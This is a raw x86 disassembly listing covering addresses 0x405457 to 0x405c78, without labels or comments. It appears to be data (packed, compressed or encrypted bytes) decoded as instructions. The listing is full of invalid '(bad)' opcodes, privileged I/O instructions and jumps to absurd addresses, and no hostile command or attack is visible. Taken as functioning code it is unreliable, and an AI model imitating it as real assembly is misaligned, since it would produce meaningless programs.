  405457:	xor    al,0x7b
  405459:	stos   BYTE PTR es:[edi],al
  40545a:	mov    WORD PTR [eax-0x5a50265],es
  405460:	(bad)  
  405462:	inc    esp
  405463:	add    BYTE PTR [ecx-0x285a417],dl
  405469:	push   0xe14c07ce
  40546e:	push   ss
  40546f:	mov    ecx,DWORD PTR [edi]
  405471:	pop    ss
  405472:	inc    esi
  405473:	mov    BYTE PTR [eax+eax*4-0x73e70da1],dh
  40547a:	xchg   ebx,eax
  40547b:	xchg   ecx,eax
  40547c:	mov    eax,ds:0xfa1e1b4c
  405481:	cld    
  405482:	es fs sub eax,0x4bde50f7
  405489:	sti    
  40548a:	xchg   esp,eax
  40548b:	(bad)
  40548e:	mov    edx,0xd556acba
  405493:	dec    edx
  405494:	dec    ebp
  405495:	loopne 0x405455
  405497:	adc    ah,BYTE PTR [esi+0x4d3cecbf]
  40549d:	es jbe 0x405514
  4054a0:	pop    edx
  4054a1:	push   ebp
  4054a2:	data16 icebp 
  4054a4:	sti    
  4054a5:	mov    al,ds:0xcd533afb
  4054aa:	aad    0x2a
  4054ac:	mov    edx,ss
  4054ae:	fld    DWORD PTR [eax+eiz*8-0x6a2dcc2c]
  4054b5:	fist   WORD PTR [eax]
  4054b7:	xchg   DWORD PTR [eax+0x6baa85a4],esi
  4054bd:	(bad)  
  4054be:	pop    ds
  4054bf:	addr16 ret 0x83df
  4054c3:	and    cl,al
  4054c5:	inc    ecx
  4054c6:	sahf   
  4054c7:	mov    edx,DWORD PTR [ebp-0x31f0b534]
  4054cd:	lea    edi,[esi-0x5e]
  4054d0:	pop    edi
  4054d1:	mov    ch,0x3f
  4054d3:	mov    WORD PTR [edx+0x48],ds
  4054d6:	and    DWORD PTR [ebx-0x41],esp
  4054d9:	fmul   DWORD PTR ds:0x25dea377
  4054df:	and    dl,BYTE PTR [edx+0x39b948b0]
  4054e5:	push   ecx
  4054e6:	sbb    bl,dl
  4054e8:	push   edi
  4054e9:	mov    ecx,0x4d32f5f9
  4054ee:	aaa    
  4054ef:	adc    dh,BYTE PTR [ebx]
  4054f1:	daa    
  4054f2:	mov    ch,BYTE PTR [ebx-0x6a]
  4054f5:	out    0x5c,eax
  4054f7:	and    al,0xee
  4054f9:	ja     0x405509
  4054fb:	xchg   esi,eax
  4054fc:	jge    0x4054d2
  4054fe:	retf   
  4054ff:	loopne 0x4054b9
  405501:	jle    0x4054de
  405503:	sahf   
  405504:	mov    ds:0xb18fcb55,eax
  405509:	xor    eax,DWORD PTR [edx-0x4f]
  40550c:	mov    DWORD PTR [ecx*4-0x61f38b79],ebp
  405513:	dec    esp
  405514:	dec    ecx
  405515:	shl    DWORD PTR [ecx+0x3d],1
  405518:	and    ecx,ebp
  40551a:	xor    al,bh
  40551c:	les    edi,FWORD PTR ds:0x662f376
  405522:	jmp    0xddfc:0x8fffae11
  405529:	fadd   DWORD PTR [ecx-0x45]
  40552c:	je     0x4054d1
  40552e:	pop    ebp
  40552f:	cmp    dh,cl
  405531:	call   0xb400bf7a
  405536:	lods   eax,DWORD PTR ds:[esi]
  405537:	fwait
  405538:	xor    BYTE PTR ss:[ecx-0x6c],dl
  40553c:	xor    ch,BYTE PTR [edi-0x1e]
  40553f:	popa   
  405540:	and    DWORD PTR [esi],eax
  405542:	mov    al,0x19
  405544:	push   eax
  405545:	lea    edi,[edi]
  405547:	sti    
  405548:	adc    BYTE PTR [ebx],dl
  40554a:	loopne 0x40559a
  40554c:	dec    ebx
  40554d:	sub    al,0xf8
  40554f:	in     al,dx
  405550:	inc    esi
  405551:	pop    ebp
  405552:	adc    eax,0x61e1eadd
  405557:	xor    BYTE PTR [ebp-0xf37d1fa],bh
  40555d:	jmp    0xed80:0x3de502ec
  405564:	mov    al,BYTE PTR [ebp+0x6e2cafeb]
  40556a:	or     DWORD PTR [eax-0x69669158],0xffffffd2
  405571:	adc    ah,BYTE PTR [eax-0x6ef341fb]
  405577:	jb     0x4055f8
  405579:	jg     0x40552a
  40557b:	lahf   
  40557c:	push   edx
  40557d:	adc    bh,BYTE PTR [esp+edx*8+0x6008bc3f]
  405584:	sbb    eax,0xe33495f3
  405589:	adc    eax,0x74839c8b
  40558e:	sub    eax,0x71a8f5be
  405593:	adc    BYTE PTR [ebx+esi*4],ch
  405596:	or     DWORD PTR [ebx],ebx
  405598:	push   eax
  405599:	iret   
  40559a:	(bad)  
  40559b:	enter  0xa047,0xbf
  40559f:	retf   
  4055a0:	iret   
  4055a1:	gs (bad) 
  4055a3:	ins    BYTE PTR es:[edi],dx
  4055a4:	adc    al,0xd2
  4055a6:	lods   eax,DWORD PTR ds:[esi]
  4055a7:	xlat   BYTE PTR ds:[ebx]
  4055a8:	fst    QWORD PTR [edi-0x40]
  4055ab:	les    esp,FWORD PTR [eax-0x2e6f3a9e]
  4055b1:	pop    ecx
  4055b2:	mov    WORD PTR [ecx-0x6d],ss
  4055b5:	sti    
  4055b6:	pop    esp
  4055b7:	mov    edx,0xcf96bae7
  4055bc:	cmp    al,0xb9
  4055be:	or     cl,al
  4055c0:	mov    al,BYTE PTR [ecx+0x3e]
  4055c3:	popf   
  4055c4:	nop
  4055c5:	das    
  4055c6:	xor    al,0x82
  4055c8:	sub    eax,0xad75eec6
  4055cd:	dec    esi
  4055ce:	popa   
  4055cf:	aam    0x6f
  4055d1:	pop    ss
  4055d2:	fidiv  WORD PTR [ecx]
  4055d4:	xor    BYTE PTR [esi],ah
  4055d6:	js     0x4055d2
  4055d8:	outs   dx,BYTE PTR ds:[esi]
  4055d9:	mov    ebx,0xcfb78a43
  4055de:	xchg   ecx,eax
  4055df:	cmp    BYTE PTR [ecx-0x7baf8199],ah
  4055e5:	add    esi,ecx
  4055e7:	lahf   
  4055e8:	mov    esp,DWORD PTR [ebp-0x2ffc2691]
  4055ee:	mov    al,0x22
  4055f0:	jno    0x405635
  4055f2:	clc    
  4055f3:	cld    
  4055f4:	into   
  4055f5:	add    DWORD PTR [ecx+0x5abe68a8],0x48bcb066
  4055ff:	lahf   
  405600:	fcomp  QWORD PTR [esi+ebx*4-0xf]
  405604:	(bad)  
  405605:	mov    dh,0xb8
  405607:	daa    
  405608:	vpunpckhdq xmm4,xmm0,XMMWORD PTR [ecx+ebp*1-0x2d61858b]
  405611:	mov    bh,0xc7
  405613:	sbb    eax,0x6af60243
  405618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405619:	outs   dx,DWORD PTR ds:[esi]
  40561a:	xchg   edi,eax
  40561b:	adc    al,0x50
  40561d:	jmp    0x81233321
  405622:	lock (bad) 
  405624:	retf   0x5a23
  405627:	pushf  
  405628:	pop    edx
  405629:	test   ch,bh
  40562b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40562c:	das    
  40562d:	retf   0x52d8
  405630:	add    BYTE PTR [edx+0x77231e09],bh
  405636:	sbb    ch,bh
  405638:	(bad)
  40563b:	ret    0x7fd1
  40563e:	lock pop ds
  405640:	sbb    ecx,DWORD PTR cs:[eax+0x55]
  405644:	jg     0x405696
  405646:	arpl   WORD PTR [edi+0x2d73a56d],sp
  40564c:	mov    dh,0x11
  40564e:	cld    
  40564f:	mov    cl,0xd7
  405651:	in     eax,dx
  405652:	mov    dh,0x2d
  405654:	ds push cs
  405656:	push   0xc8340bc2
  40565b:	addr16 push 0x10f1d35e
  405661:	lahf   
  405662:	pop    ebx
  405663:	jg     0x40568b
  405665:	mov    es,WORD PTR [ebp+eiz*1-0x64e566]
  40566c:	xchg   ecx,eax
  40566d:	es into 
  40566f:	sbb    bl,bl
  405671:	(bad)  
  405672:	repnz or BYTE PTR [ecx+0x40],al
  405676:	or     dl,BYTE PTR [esp+edi*1-0x73b56a9b]
  40567d:	fs jecxz 0x405691
  405680:	loope  0x405685
  405682:	dec    eax
  405683:	sub    eax,0x5dfed8af
  405688:	xchg   edi,eax
  405689:	or     ah,BYTE PTR [esi-0x35971345]
  40568f:	cs not edx
  405692:	sbb    esi,DWORD PTR [ecx]
  405694:	inc    ebp
  405695:	xor    BYTE PTR [edi+0x5a],cl
  405698:	outs   dx,DWORD PTR ds:[esi]
  405699:	mov    esi,0x9f5350fe
  40569e:	mov    eax,fs
  4056a0:	loopne 0x40566d
  4056a2:	or     al,BYTE PTR ds:[ebx-0x35]
  4056a6:	mov    esp,0x16e4787d
  4056ab:	add    BYTE PTR [ecx],bl
  4056ad:	cmp    edi,DWORD PTR [bx]
  4056b0:	and    dl,BYTE PTR [ebx]
  4056b2:	or     dh,BYTE PTR [edx-0x7f0a37da]
  4056b8:	mov    BYTE PTR [eax+eax*1],0x27
  4056bc:	call   0xf115:0x6b8b8793
  4056c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056c5:	inc    esi
  4056c6:	jmp    DWORD PTR [esi+eax*8]
  4056c9:	or     ch,ch
  4056cb:	mov    ebp,0x35b3e66b
  4056d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056d1:	xchg   edx,eax
  4056d2:	mov    al,ds:0x3c2434e3
  4056d7:	add    ebx,edi
  4056d9:	pushf  
  4056da:	sub    DWORD PTR [edx-0x81797b2],esp
  4056e0:	jo     0x405755
  4056e2:	lods   eax,DWORD PTR ds:[esi]
  4056e3:	push   ebx
  4056e4:	xchg   esp,eax
  4056e5:	cmp    eax,0xc35c06c5
  4056ea:	dec    ebx
  4056eb:	(bad)  
  4056ec:	out    dx,al
  4056ed:	xchg   DWORD PTR [eax+0x1d],eax
  4056f0:	ficomp WORD PTR [eax-0x373f646a]
  4056f6:	push   ss
  4056f7:	repnz pop esp
  4056f9:	push   es
  4056fa:	cmp    BYTE PTR [ecx+0x7d632d03],ah
  405700:	cmp    eax,0x803eec78
  405705:	xor    ebp,ebx
  405707:	push   esi
  405708:	pop    esp
  405709:	jp     0x4056f9
  40570b:	mov    ds:0xc1bcad7c,al
  405710:	mov    ds:0x1aef5df7,al
  405715:	sub    DWORD PTR [edx-0x78],ecx
  405718:	data16 (bad) 
  40571a:	pop    edi
  40571b:	sahf   
  40571c:	lds    edi,FWORD PTR [ebp-0x1b90747c]
  405722:	pushf  
  405723:	je     0x405756
  405725:	retf   0xd229
  405728:	dec    esp
  405729:	shl    ebx,cl
  40572b:	lods   eax,DWORD PTR ds:[esi]
  40572c:	or     DWORD PTR [eax-0x1f],edi
  40572f:	and    DWORD PTR [eax-0x3e5b1b96],0x83c1d2fc
  405739:	repz push ebx
  40573b:	push   esp
  40573c:	arpl   WORD PTR [esi-0x3188aa92],bp
  405742:	ret    0xb4b3
  405745:	das    
  405746:	call   0x405f:0x25d987a1
  40574d:	jg     0x405718
  40574f:	pop    esp
  405750:	and    al,0xd7
  405752:	mov    ah,0x75
  405754:	clc    
  405755:	aaa    
  405756:	bound  edx,QWORD PTR [esi-0x4cf21409]
  40575c:	and    eax,0xe0b99f64
  405761:	cmp    eax,0xb01d2968
  405766:	idiv   DWORD PTR [eax+0x2cef0ae0]
  40576c:	mov    bh,0x78
  40576e:	mul    esp
  405770:	jmp    DWORD PTR [ebx+0x76]
  405773:	aam    0x7e
  405775:	push   ds
  405776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405777:	xchg   esp,eax
  405778:	addr16 aas 
  40577a:	xchg   esi,eax
  40577b:	mov    eax,ds:0xd8c65b33
  405780:	add    eax,0xc4e277c0
  405785:	pop    esi
  405786:	outs   dx,DWORD PTR ds:[esi]
  405787:	sahf   
  405788:	sub    al,BYTE PTR [ebx]
  40578a:	jmp    0x4057e1
  40578c:	mov    esi,0x7d13b0f7
  405791:	cmp    al,0x42
  405793:	cmp    DWORD PTR [edi],esp
  405795:	rcr    DWORD PTR [esi],0xe1
  405798:	mov    bh,0xa2
  40579a:	js     0x405809
  40579c:	push   esi
  40579d:	ins    BYTE PTR es:[edi],dx
  40579e:	cli    
  40579f:	mov    al,0xf6
  4057a1:	and    al,0xd1
  4057a3:	push   0x6e
  4057a5:	lods   al,BYTE PTR ds:[esi]
  4057a6:	jle    0x405749
  4057a8:	arpl   WORD PTR [eax+ebp*8+0x6e],cx
  4057ac:	pop    esp
  4057ad:	fisub  DWORD PTR [ebx+esi*8+0x52c9e563]
  4057b4:	arpl   cx,bx
  4057b6:	mov    edi,0xe1d81deb
  4057bb:	mov    cl,0x31
  4057bd:	xchg   edi,eax
  4057be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057bf:	daa    
  4057c0:	mov    eax,0x625c8e91
  4057c5:	pop    ss
  4057c6:	mov    dh,0xb4
  4057c8:	out    dx,eax
  4057c9:	fadd   DWORD PTR [edx]
  4057cb:	sti    
  4057cc:	ficomp DWORD PTR [edi+0x4422392]
  4057d2:	aad    0xf6
  4057d4:	aaa    
  4057d5:	(bad)  
  4057d6:	rol    BYTE PTR [edx-0x22faa336],1
  4057dc:	outs   dx,BYTE PTR ds:[esi]
  4057dd:	inc    ebp
  4057de:	add    eax,0xe1b17764
  4057e3:	retf   
  4057e4:	aad    0x6b
  4057e6:	test   al,0xfb
  4057e8:	(bad)  
  4057ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057eb:	lahf   
  4057ec:	mul    DWORD PTR [esi-0x3387f1d0]
  4057f2:	add    esi,DWORD PTR [esi+0x6295e443]
  4057f8:	outs   dx,DWORD PTR ds:[esi]
  4057f9:	mov    al,0xd4
  4057fb:	jmp    0xd869:0xa1f8d0ac
  405802:	mov    ecx,0xb8813764
  405807:	inc    ebx
  405808:	fs push cs
  40580a:	cmp    DWORD PTR ds:0x4cb200b0,0x3afbd833
  405814:	inc    ecx
  405815:	sqrtps xmm0,XMMWORD PTR [edi+0x13]
  405819:	lahf   
  40581a:	or     ah,bl
  40581c:	(bad)  
  40581d:	sbb    cl,BYTE PTR ds:0x516ad464
  405823:	pop    ds
  405824:	test   al,0x45
  405826:	add    dl,al
  405828:	into   
  405829:	pop    edx
  40582a:	mov    cl,0x37
  40582c:	das    
  40582d:	rcl    BYTE PTR [eax+0x7c030675],1
  405833:	fbstp  TBYTE PTR [edx+ebx*8+0x791ca428]
  40583a:	push   edx
  40583b:	push   ebp
  40583c:	fnsave ds:0x7dcf6f4
  405842:	mov    al,0x88
  405844:	mov    al,ds:0x785b9f88
  405849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40584a:	mov    edx,0xb254bc11
  40584f:	dec    edi
  405850:	test   DWORD PTR [ebx],edx
  405852:	(bad)  
  405853:	jae    0x40583a
  405855:	push   ebp
  405856:	aam    0x84
  405858:	dec    esi
  405859:	mov    eax,ds:0x19af30d4
  40585e:	loope  0x4058df
  405860:	lods   eax,DWORD PTR ds:[esi]
  405861:	lods   eax,DWORD PTR ds:[esi]
  405862:	in     eax,0x36
  405864:	jle    0x40586f
  405866:	pop    ebx
  405867:	jns    0x4058db
  405869:	jbe    0x405887
  40586b:	mov    DWORD PTR [esi+0x4b],eax
  40586e:	xor    al,0xef
  405870:	adc    DWORD PTR [ebx],ecx
  405872:	ret    0xa5b3
  405875:	inc    edi
  405876:	icebp  
  405877:	and    BYTE PTR [esi+0x4be1c265],dh
  40587d:	add    esp,DWORD PTR [eax+0x11f7097e]
  405883:	and    DWORD PTR [eax-0x21],ebp
  405886:	aad    0x63
  405888:	int    0xaa
  40588a:	cmp    al,BYTE PTR [ebx-0x30]
  40588d:	retf   
  40588e:	pop    ebp
  40588f:	inc    esp
  405890:	repnz xchg ebp,eax
  405892:	in     eax,dx
  405893:	inc    edx
  405894:	lds    ebx,FWORD PTR [eax]
  405896:	sub    al,0x12
  405898:	ins    BYTE PTR es:[edi],dx
  405899:	fisttp DWORD PTR [esi-0x25]
  40589c:	xlat   BYTE PTR ds:[ebx]
  40589d:	push   es
  40589e:	xor    ecx,esi
  4058a0:	lds    eax,FWORD PTR [ebx-0x42]
  4058a3:	jle    0x405857
  4058a5:	clc    
  4058a6:	pop    edx
  4058a7:	push   cs
  4058a8:	fcomi  st,st(6)
  4058aa:	xlat   BYTE PTR ds:[ebx]
  4058ab:	and    edi,edi
  4058ad:	(bad)  [ecx]
  4058af:	mov    ecx,0xc5e67dac
  4058b4:	push   cs
  4058b5:	imul   edx,DWORD PTR [edi+0x63],0x978cf3cc
  4058bc:	mov    BYTE PTR [ebx+0x3cf2a4f8],bh
  4058c2:	and    ah,BYTE PTR [eax]
  4058c4:	adc    DWORD PTR [esi-0x56],eax
  4058c7:	mov    ds,WORD PTR [edx+0x6a]
  4058ca:	xor    DWORD PTR [ebx],ebx
  4058cc:	jge    0x405908
  4058ce:	adc    dl,ah
  4058d0:	mov    ecx,0x815958d
  4058d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058d6:	lods   eax,DWORD PTR ds:[esi]
  4058d7:	(bad)  
  4058d8:	hlt    
  4058d9:	xor    ebp,DWORD PTR [eax+0x21]
  4058dc:	jno    0x4058c4
  4058de:	lods   eax,DWORD PTR ds:[esi]
  4058df:	sub    eax,0xe09ac20
  4058e4:	mov    edx,0xf256d7e
  4058e9:	arpl   di,cx
  4058eb:	jp     0x405937
  4058ed:	and    eax,0x7ca837e8
  4058f2:	(bad)  
  4058f3:	sar    BYTE PTR [eax],cl
  4058f5:	pusha  
  4058f6:	jg     0x405968
  4058f8:	pop    esp
  4058f9:	or     al,0xca
  4058fb:	call   0x4d5720e4
  405900:	int    0x2e
  405902:	fcom   DWORD PTR [esi+ecx*1-0x23de5a68]
  405909:	push   ecx
  40590a:	lock xchg cl,dh
  40590d:	push   esp
  40590e:	(bad)  
  40590f:	jmp    0x1fb2:0xe35b0d77
  405916:	and    al,BYTE PTR [edx+0x37605cd0]
  40591c:	mov    cl,0x3
  40591e:	xor    dl,BYTE PTR [ebx+0x7cb6d92d]
  405924:	sti    
  405925:	fbld   TBYTE PTR [esi+0x46]
  405928:	add    eax,0xf98845e7
  40592d:	dec    esi
  40592e:	inc    esi
  40592f:	adc    DWORD PTR [edi+0x4c],ebp
  405932:	pop    esp
  405933:	das    
  405934:	sub    ecx,DWORD PTR [esi-0x60]
  405937:	pop    ebp
  405938:	mov    bl,BYTE PTR [eax-0x7c]
  40593b:	fdivr  QWORD PTR [ebx-0x605435db]
  405941:	and    ah,BYTE PTR [ebp+0x544adb89]
  405947:	jg     0x40599e
  405949:	cli    
  40594a:	sbb    al,0xf5
  40594c:	xor    eax,0xf90db323
  405951:	add    ah,cl
  405953:	pop    ebx
  405954:	inc    ebp
  405955:	jno    0x4059b5
  405957:	in     al,0xf8
  405959:	jmp    0x2c5f6aa0
  40595e:	or     BYTE PTR [ecx+0x57],dl
  405961:	cmp    eax,0xf2aea2ab
  405966:	inc    edi
  405967:	adc    DWORD PTR [ebp-0x3958d50f],esp
  40596d:	mov    DWORD PTR [ebx-0x49d41e87],ebx
  405973:	js     0x4059d3
  405975:	inc    ebx
  405977:	and    eax,0x89750216
  40597c:	adc    eax,0xf45c3a69
  405982:	out    dx,eax
  405983:	cli    
  405984:	xor    eax,0x890cdf4c
  405989:	in     eax,0xb6
  40598b:	push   edi
  40598c:	xor    eax,0x9d7b15fa
  405991:	hlt    
  405992:	imul   esp,DWORD PTR [ebp+eiz*8+0x61],0x20
  405997:	(bad)  
  405998:	cli    
  405999:	lods   eax,DWORD PTR ds:[esi]
  40599a:	mov    eax,0x2e43aa1c
  40599f:	add    eax,0x3b02b12c
  4059a4:	sub    BYTE PTR fs:[edi+0x30],bh
  4059a8:	test   eax,0xdf4b10b8
  4059ad:	dec    edx
  4059ae:	div    BYTE PTR [edx-0x73]
  4059b1:	xchg   BYTE PTR [ecx+0x3a],bh
  4059b4:	pop    edi
  4059b5:	jp     0x405983
  4059b7:	dec    ebx
  4059b8:	sub    DWORD PTR [edx+0x6c142c4f],0xffffffe8
  4059bf:	shr    esi,cl
  4059c1:	pop    ebx
  4059c2:	mov    al,0x7a
  4059c4:	aam    0x62
  4059c6:	aaa    
  4059c7:	sub    al,0xea
  4059c9:	call   0xd4a7feea
  4059ce:	push   ss
  4059cf:	mov    ds:0x2d14e3da,al
  4059d4:	call   0x75054282
  4059d9:	push   cs
  4059da:	xor    ebp,ebp
  4059dc:	inc    esp
  4059de:	out    dx,eax
  4059df:	(bad)  
  4059e0:	mov    bh,0xe0
  4059e2:	push   esp
  4059e3:	push   cs
  4059e4:	(bad)  
  4059e5:	mov    ah,0x7e
  4059e7:	jge    0x4059da
  4059e9:	mov    DWORD PTR [eax],ebx
  4059eb:	das    
  4059ec:	inc    ebp
  4059ed:	mov    DWORD PTR [edx+eax*4],ecx
  4059f0:	sbb    eax,0xb543beb
  4059f5:	and    ebp,DWORD PTR [ebp-0x14]
  4059f8:	repz mov edx,0x517cc5af
  4059fe:	xor    eax,ebx
  405a00:	xchg   ebp,eax
  405a01:	lods   eax,DWORD PTR ds:[esi]
  405a02:	test   al,0xb2
  405a04:	fwait
  405a05:	jle    0x4059a0
  405a07:	fnstsw WORD PTR [ecx]
  405a09:	and    ecx,ecx
  405a0b:	imul   DWORD PTR [ebp-0x6e]
  405a0e:	sub    al,BYTE PTR [ebx-0x3f]
  405a11:	jo     0x405a03
  405a13:	inc    ebp
  405a14:	mov    al,0x35
  405a16:	sbb    eax,0xb62e6a02
  405a1b:	mov    dl,0xc6
  405a1d:	sbb    eax,0xd80ff7f7
  405a22:	push   edx
  405a23:	ds pop edi
  405a25:	or     eax,0x1ccdf3c9
  405a2a:	xor    esp,DWORD PTR [edi]
  405a2c:	and    bl,BYTE PTR [ebp-0x7d99198]
  405a32:	push   ebx
  405a33:	ins    DWORD PTR es:[edi],dx
  405a34:	cmp    dh,BYTE PTR [ecx-0x269a5139]
  405a3a:	push   eax
  405a3b:	mov    edx,0x645c4ad5
  405a40:	lods   al,BYTE PTR ds:[esi]
  405a41:	ficom  WORD PTR [eax-0x67]
  405a44:	jp     0x4059cb
  405a46:	shr    al,cl
  405a48:	inc    edi
  405a49:	cmp    ch,BYTE PTR es:[edx-0x4c0fe52f]
  405a50:	fs pop ds
  405a52:	push   ebp
  405a53:	dec    esi
  405a54:	adc    BYTE PTR [ecx],bl
  405a56:	test   BYTE PTR [esi+eiz*1+0x5a3e02a8],ch
  405a5d:	pusha  
  405a5e:	aam    0xc1
  405a60:	sbb    eax,0x83a1eb89
  405a65:	and    edx,esp
  405a67:	push   0xbeeab222
  405a6c:	sbb    DWORD PTR [ebx-0x48],edi
  405a6f:	repnz out 0xe2,al
  405a72:	iret   
  405a73:	(bad)  
  405a74:	cs out dx,al
  405a76:	ret    
  405a77:	or     dl,ah
  405a79:	or     ebx,DWORD PTR [ecx-0x74]
  405a7c:	mov    BYTE PTR [esi],0xc6
  405a7f:	pop    esp
  405a80:	sbb    eax,0xe413648c
  405a85:	pop    edx
  405a86:	xchg   edi,eax
  405a87:	ins    BYTE PTR es:[edi],dx
  405a88:	les    esp,FWORD PTR [ebx]
  405a8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a8b:	mov    eax,0xc18608ea
  405a90:	jmp    0xe9f4:0x7dfbc397
  405a97:	ss cmp al,0x6
  405a9a:	bnd jp 0x405a4b
  405a9d:	(bad)  
  405a9e:	sbb    esi,esp
  405aa0:	jmp    0x10ff:0x4deb7138
  405aa7:	sub    al,0xad
  405aa9:	fst    DWORD PTR [edx]
  405aab:	adc    eax,0xd1c2a705
  405ab0:	lea    eax,[edx+0x24]
  405ab3:	test   eax,0x1b770c4c
  405ab8:	pop    esi
  405ab9:	mov    bh,0xb9
  405abb:	sbb    cl,ch
  405abd:	std    
  405abe:	push   0x5e
  405ac0:	inc    esi
  405ac1:	xchg   esp,eax
  405ac2:	xchg   ebp,eax
  405ac3:	pop    es
  405ac4:	mov    WORD PTR [edx+0x79],?
  405ac7:	jmp    0x6ba7:0xc6a67727
  405ace:	in     eax,0x62
  405ad0:	xchg   ebx,eax
  405ad1:	cwde   
  405ad2:	int3   
  405ad3:	xchg   ecx,eax
  405ad4:	sti    
  405ad5:	mov    ebp,0x1885ed46
  405ada:	leave  
  405adb:	imul   esi,DWORD PTR [esi-0x6fc5b0bd],0x7015b4b0
  405ae5:	xchg   ebp,eax
  405ae6:	test   eax,0xb7e3d874
  405aeb:	das    
  405aec:	jp     0x405ad2
  405aee:	(bad)  
  405aef:	out    dx,al
  405af0:	mov    ebx,0x4f53f6e0
  405af5:	xchg   ebx,eax
  405af6:	aam    0xa9
  405af8:	repnz and eax,0x78e89d41
  405afe:	adc    DWORD PTR [ebp+esi*1+0x64],esi
  405b02:	retf   0x7ed6
  405b05:	out    dx,eax
  405b06:	test   eax,0x22d9f14c
  405b0b:	cs jmp 0x405b27
  405b0e:	mov    esi,ebx
  405b10:	in     eax,dx
  405b11:	imul   edi,ecx,0xc
  405b14:	dec    ebx
  405b15:	icebp  
  405b16:	jb     0x405a99
  405b18:	cmp    BYTE PTR [esi+0xa80937b],dl
  405b1e:	ss data16 jae 0x405aad
  405b22:	scas   eax,DWORD PTR es:[edi]
  405b23:	test   ah,bh
  405b25:	add    al,0x67
  405b27:	mov    edi,0xa011096
  405b2c:	daa    
  405b2d:	outs   dx,DWORD PTR ds:[esi]
  405b2e:	mov    ebp,0x1c050720
  405b33:	adc    al,al
  405b35:	test   al,0x36
  405b37:	lods   al,BYTE PTR ds:[esi]
  405b38:	ds aad 0xbf
  405b3b:	adc    ebx,ebx
  405b3d:	sub    ebp,DWORD PTR [edx]
  405b3f:	cwde   
  405b40:	fwait
  405b41:	and    ebp,DWORD PTR ds:0x1039de8d
  405b47:	out    0x8,eax
  405b49:	imul   eax,DWORD PTR [eax-0x4804922f],0x726b010
  405b53:	add    eax,0x1ae4fb7f
  405b58:	adc    DWORD PTR [esi-0x7e],ebx
  405b5b:	mov    ds:0x300217a3,al
  405b60:	jns    0x405b16
  405b62:	lock jmp 0x405bc5
  405b65:	xchg   DWORD PTR cs:[ebp-0x28839f94],ebx
  405b6c:	pop    ebp
  405b6d:	xor    esi,ecx
  405b6f:	in     al,0xc3
  405b71:	sub    DWORD PTR [edi-0x78e6532e],0x376c26de
  405b7b:	xchg   ebp,eax
  405b7c:	shr    DWORD PTR [edi-0x6df587d],0x35
  405b83:	push   0x6b898512
  405b88:	retf   0x64ae
  405b8b:	jmp    0xa484:0x18ae3378
  405b92:	rcr    cl,0x12
  405b95:	push   ebx
  405b96:	sbb    eax,0x719a91
  405b9b:	mov    eax,0xa1af575b
  405ba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ba1:	mov    ds:0x728e8ac4,eax
  405ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ba7:	pop    esp
  405ba8:	rcl    BYTE PTR [ebx-0x7ae5de80],cl
  405bae:	adc    edx,DWORD PTR [esp+edi*1-0x10]
  405bb2:	fild   WORD PTR [ebx]
  405bb4:	bound  esi,QWORD PTR [edi]
  405bb6:	(bad)  
  405bb7:	stc    
  405bb8:	xor    eax,0x5ba6c9cb
  405bbd:	test   eax,0x32f255ef
  405bc2:	loop   0x405bd8
  405bc4:	xor    al,0x4c
  405bc6:	cs push cs
  405bc8:	scas   al,BYTE PTR es:[edi]
  405bc9:	les    ebx,FWORD PTR [edi]
  405bcb:	sub    eax,0x85bff530
  405bd0:	cmp    eax,0x88d409f
  405bd5:	bound  edx,QWORD PTR [edx-0x8a30f27]
  405bdb:	fnsave [ebx-0x398e0815]
  405be1:	xor    BYTE PTR [edi+0x56],ah
  405be4:	iret   
  405be5:	mov    ds:0x497b0bbb,eax
  405bea:	xlat   BYTE PTR ds:[ebx]
  405beb:	out    0x35,al
  405bed:	pop    edx
  405bee:	call   0x493e3712
  405bf3:	lods   eax,DWORD PTR ds:[esi]
  405bf4:	or     BYTE PTR [ebp+eax*4-0x8],al
  405bf8:	stos   DWORD PTR es:[edi],eax
  405bf9:	jmp    0x561ecb3f
  405bfe:	cwde   
  405bff:	out    dx,al
  405c00:	shr    BYTE PTR [edx+0x713b0f27],0xbe
  405c07:	mov    eax,ds:0x2587898f
  405c0c:	xchg   esi,eax
  405c0d:	shl    DWORD PTR [esi+0x59],cl
  405c10:	pop    ss
  405c11:	push   edx
  405c12:	inc    esp
  405c13:	out    dx,al
  405c14:	inc    edx
  405c15:	sbb    eax,0x57f1c175
  405c1a:	std    
  405c1b:	cmc    
  405c1c:	ds gs add esp,edx
  405c20:	das    
  405c21:	shl    ecx,cl
  405c23:	mov    al,0x9e
  405c25:	leave  
  405c26:	popa   
  405c27:	sbb    al,0x4
  405c29:	ja     0x405bf6
  405c2b:	mov    edx,0xf695bfaa
  405c30:	cmp    eax,DWORD PTR [edi]
  405c32:	(bad)  
  405c33:	mul    DWORD PTR [eax-0x1e]
  405c36:	push   ebp
  405c37:	mov    eax,ds:0x1386f43
  405c3c:	dec    ebx
  405c3d:	out    0xb2,eax
  405c3f:	or     al,0x86
  405c41:	cld    
  405c42:	dec    DWORD PTR [edi-0x6c1461d5]
  405c48:	or     al,0xe3
  405c4a:	mov    ch,0x4
  405c4c:	sbb    al,0x70
  405c4e:	cmp    al,BYTE PTR es:[ecx+0x16fb3709]
  405c55:	gs int3 
  405c57:	cmp    al,0xe
  405c59:	xor    al,0x12
  405c5b:	in     eax,dx
  405c5c:	stos   BYTE PTR es:[edi],al
  405c5d:	ins    DWORD PTR es:[edi],dx
  405c5e:	cli    
  405c5f:	inc    edx
  405c60:	mov    al,ds:0x7113f29a
  405c65:	push   ss
  405c66:	mov    WORD PTR [ecx-0x5c],gs
  405c69:	js     0x405cc4
  405c6b:	arpl   ax,di
  405c6d:	sbb    BYTE PTR [esi+0x36df4261],ch
  405c73:	arpl   di,ax
  405c75:	sahf   
  405c76:	jne    0x405cd6
  405c78:	sahf   
